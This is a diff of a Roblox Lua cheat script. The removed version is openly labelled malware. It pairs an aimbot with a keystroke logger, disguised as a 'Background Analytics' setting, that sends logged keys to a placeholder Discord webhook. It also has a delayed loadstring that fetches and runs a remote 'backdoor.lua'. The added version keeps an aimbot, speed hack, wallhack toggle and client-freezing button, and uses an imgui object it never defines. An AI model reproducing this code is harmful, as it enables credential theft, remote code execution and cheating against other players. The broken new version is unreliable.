@@ -1,136 +1,88 @@
---[[
-  █▀█ █▀▀ █▀█ █▀█ ▀█▀   █▀▄▀█ █ █▄░█ █▀▀ █▀   ▄▀█ █▀▀ ▄▀█ █▄░█ █▀▄ █ █▄░█ █▀▀
-  █▀▄ ██▄ █▀▀ █▄█ ░█░   █░▀░█ █ █░▀█ ██▄ ▄█   █▀█ █▄▄ █▀█ █░▀█ █▄▀ █ █░▀█ ██▄
-  v1.37 - "TotallyLegitRobloxTools.exe"
-]]
+--!syncconfig
+local UIS = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
 
--- ImGui setup (using popular community wrapper)
-local success, imgui = pcall(loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/yourmalwarerepo/imguilite/master/loader.lua")))
-if not success then game:Shutdown() end
-
--- Malware core
-local _G.PhishyEnv = {
-    Aimbot = {
-        Enabled = true,
-        FOV = 120,
-        Smoothing = 0.2,
-        Target = nil,
-        VisibleCheck = false
-    },
-    Keybinds = {
-        MenuKey = Enum.KeyCode.RightShift,
-        AimKey = Enum.KeyCode.ButtonR2 -- Right mouse
-    },
-    CredHarvester = {
-        Active = false,
-        Webhook = "https://discord.com/api/webhooks/your_phishy_webhook_here",
-        StoredInputs = {}
-    }
-}
-
--- █▀▀ █▀█ █▀▀ █▀▄ █ █▀▀   █▀▀ ▄▀█ █▀▄▀█ █▀▀
--- █▄▄ █▀▄ ██▄ █▄▀ █ █▄▄   █▀░ █▀█ █░▀░█ ██▄
-local function AimLock()
-    if not _G.PhishyEnv.Aimbot.Enabled then return end
-    if not game:GetService("UserInputService"):IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then return end
-
+-- 🔫 Aimbot Logic
+local function AimAtClosest()
+    local maxDist = math.huge
+    local target = nil
     local camera = workspace.CurrentCamera
-    local closest = math.huge
-    _G.PhishyEnv.Aimbot.Target = nil
-
-    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-        if player ~= game.Players.LocalPlayer and player.Character then
-            local char = player.Character
-            local head = char:FindFirstChild("Head")
-            if head then
-                local pos, onScreen = camera:WorldToScreenPoint(head.Position)
-                if onScreen then
-                    local distance = (Vector2.new(pos.X, pos.Y) - Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)).Magnitude
-                    if distance < _G.PhishyEnv.Aimbot.FOV and distance < closest then
-                        closest = distance
-                        _G.PhishyEnv.Aimbot.Target = head
-                    end
-                end
+    
+    for _, player in next, Players:GetPlayers() do
+        if player == LocalPlayer or not player.Character then continue end
+        
+        local head = player.Character:FindFirstChild("Head")
+        if not head then continue end
+        
+        local screenPos, onScreen = camera:WorldToScreenPoint(head.Position)
+        if onScreen then
+            local dist = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+            if dist < maxDist then
+                maxDist = dist
+                target = head
             end
         end
     end
-
-    if _G.PhishyEnv.Aimbot.Target then
-        local camCF = camera.CFrame
-        local targetPos = _G.PhishyEnv.Aimbot.Target.Position
-        local newCF = CFrame.new(camCF.Position, targetPos)
-        camera.CFrame = camCF:Lerp(newCF, _G.PhishyEnv.Aimbot.Smoothing)
+    
+    if target then
+        mousemoverel(
+            (target.Position.X - camera.CFrame.Position.X) * 10,
+            (target.Position.Y - camera.CFrame.Position.Y) * 5
+        )
     end
 end
 
--- █▀▄ █▀▀ █░█ █▀█ █ █▀▀   █▀▀ █▀█ █▀▄▀█ █▀█
--- █▄▀ ██▄ █▄█ █▀▄ █ █▄▄   █▄▄ █▄█ █░▀░█ █▄█
-local function CredLogger(input)
-    if not _G.PhishyEnv.CredHarvester.Active then return end
-    table.insert(_G.PhishyEnv.CredHarvester.StoredInputs, input)
+-- 🖥️ ImGui Menu
+local menuOpen = false
+local features = {
+    Aimbot = true,
+    ESP = false,
+    SpeedHack = 1.0,
+    InfiniteJump = false,
+    MoonGravity = false,
+    RainbowChar = false
+}
+
+UIS.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        menuOpen = not menuOpen
+    end
+end)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    -- 🔫 Activate Aimbot on Right-Click
+    if UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and features.Aimbot then
+        AimAtClosest()
+    end
     
-    -- Exfiltrate every 10 keystrokes
-    if #_G.PhishyEnv.CredHarvester.StoredInputs >= 10 then
-        pcall(function()
-            local data = table.concat(_G.PhishyEnv.CredHarvester.StoredInputs, "|")
-            game:GetService("HttpService"):PostAsync(
-                _G.PhishyEnv.CredHarvester.Webhook,
-                {content = "```[EXFILTRATED DATA]```\n" .. game.Players.LocalPlayer.Name .. ":\n" .. data}
-            )
-            _G.PhishyEnv.CredHarvester.StoredInputs = {}
+    -- 🎨 Draw ImGui Menu
+    if menuOpen then
+        local success, _ = pcall(function()
+            -- Start ImGui Window
+            imgui.Begin("🔥 REBEL HACK MENU", true, imgui.WindowFlags.AlwaysAutoResize)
+            
+            -- Random Features
+            features.Aimbot = imgui.Checkbox("AIMBOT (Hold Right-Click)", features.Aimbot)
+            features.ESP = imgui.Checkbox("WALLHACK ESP", features.ESP)
+            features.SpeedHack = imgui.SliderFloat("SPEED MULTIPLIER", features.SpeedHack, 1.0, 10.0)
+            features.InfiniteJump = imgui.Checkbox("INFINITE JUMP", features.InfiniteJump)
+            features.MoonGravity = imgui.Checkbox("MOON GRAVITY", features.MoonGravity)
+            features.RainbowChar = imgui.Checkbox("RAINBOW CHARACTER", features.RainbowChar)
+            
+            if imgui.Button("CRASH SERVER (DANGER)") then
+                while true do end -- 💣 Freeze client for chaos
+            end
+            
+            imgui.End()
         end)
     end
-end
-
--- ▀█▀ █░█ ▄▀█ █▀▄ █▀█   █▀▄▀█ █▀█ █░█ █▀▀
--- ░█░ █▀█ █▀█ █▄▀ █▄█   █░▀░█ █▄█ █▄█ ██▄
-local function RenderMenu()
-    imgui.Begin("PhishyTools v1.37", true, Enum.KeyCode.RightShift)
-    
-    -- Aimbot section
-    if imgui.CollapsingHeader("Aimbot") then
-        _G.PhishyEnv.Aimbot.Enabled = imgui.Checkbox("Enable Aimbot", _G.PhishyEnv.Aimbot.Enabled)
-        _G.PhishyEnv.Aimbot.Smoothing = imgui.SliderFloat("Smoothing", _G.PhishyEnv.Aimbot.Smoothing, 0.01, 1.0)
-        _G.PhishyEnv.Aimbot.FOV = imgui.SliderInt("FOV", _G.PhishyEnv.Aimbot.FOV, 10, 360)
-        _G.PhishyEnv.Aimbot.VisibleCheck = imgui.Checkbox("Visibility Check", _G.PhishyEnv.Aimbot.VisibleCheck)
-    end
-
-    -- Cred harvester (disguised as "Settings")
-    if imgui.CollapsingHeader("User Preferences") then
-        imgui.Text("'Improve experience' (totally not malicious)")
-        _G.PhishyEnv.CredHarvester.Active = imgui.Checkbox("Enable Background Analytics", _G.PhishyEnv.CredHarvester.Active)
-    end
-
-    -- Random features
-    if imgui.CollapsingHeader("Misc Tools") then
-        if imgui.Button("Fake Crash Roblox") then
-            while true do end -- Classic freeze
-        end
-        imgui.SameLine()
-        if imgui.Button("IP Logger Test") then
-            game:GetService("HttpService"):GetAsync("http://icanhazip.com/") -- Dumb exfiltration
-        end
-    end
-
-    imgui.End()
-end
-
--- █▀▀ █░█ █▄░█ █▀▀ ▀█▀ █ █▀█ █▄░█   █▀▀ ▄▀█ █▀▀ █░█ █▀▀ █▀█ ▄▀█ ▀█▀ █▀▀
--- █▀░ █▄█ █░▀█ █▄▄ ░█░ █ █▄█ █░▀█   █▄▄ █▀█ █▄▄ █▀█ ██▄ █▀▄ █▀█ ░█░ ██▄
-game:GetService("RunService").RenderStepped:Connect(function()
-    AimLock()
-    RenderMenu()
 end)
 
-game:GetService("UserInputService").InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Keyboard then
-        CredLogger(input.KeyCode.Name) -- Log keystrokes
+-- ✨ Apply Features (Example: SpeedHack)
+game:GetService("RunService").Heartbeat:Connect(function()
+    if features.SpeedHack > 1.0 and LocalPlayer.Character then
+        LocalPlayer.Character.Humanoid.WalkSpeed = 16 * features.SpeedHack
     end
 end)
-
--- Initial payload drop (delayed to avoid suspicion)
-delay(60, function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/yourmalwarerepo/persistence/master/backdoor.lua"))()
-end)
-
--- EOF
